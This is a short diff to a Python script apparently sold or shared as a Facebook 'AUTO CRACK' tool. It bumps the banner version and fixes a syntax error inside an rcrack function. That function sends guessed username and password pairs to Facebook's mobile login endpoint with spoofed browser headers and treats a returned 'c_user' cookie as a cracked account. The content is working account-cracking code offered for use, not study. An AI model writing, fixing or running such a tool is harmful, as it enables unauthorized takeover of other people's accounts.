@@ -103,7 +103,7 @@ d8888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
 [√] WATHAPP : 0130xxxxx54
 [√] TOOLS   : AUTO CRACK
 [√] Stetus  : FREE
-[★]VIRSION  : 0.1.5
+[★]VIRSION  : 0.1.7
 ====================================================""") 
 loop = 0
 oks = []
@@ -242,7 +242,6 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
-}
             lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
